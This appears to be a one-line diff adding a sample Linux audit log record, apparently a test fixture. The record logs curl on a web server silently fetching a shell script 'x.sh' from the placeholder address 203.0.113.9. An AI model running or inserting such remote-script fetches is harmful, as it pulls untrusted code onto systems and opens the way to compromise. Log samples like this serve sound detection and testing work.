@@ -1,0 +1,1 @@
+<13>Oct  1 12:00:01 web-01 audispd: node=web-01 type=EXECVE msg=audit(1790846401.456:4570): argc=3 a0="curl" a1="-s" a2="http://203.0.113.9/x.sh"
